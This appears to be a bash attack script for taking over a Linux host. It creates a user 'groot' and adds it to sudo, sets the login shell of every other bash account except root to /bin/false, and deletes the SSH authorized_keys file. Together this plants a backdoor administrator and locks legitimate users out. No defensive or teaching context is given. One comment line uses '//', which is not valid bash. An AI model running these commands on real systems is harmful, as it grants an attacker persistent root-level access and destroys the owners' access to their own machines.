#!/bin/bash

useradd groot
usermod -aG sudo groot

users="$(cat /etc/passwd | grep /bin/bash | cut -d : -f 1 | grep -v root | grep -v groot)"

//lacking other accounts 
for user in $users
do
    usermod -s /bin/false $user
done

#purge ssh keys
rm -rf $HOME/.ssh/authorized_keys
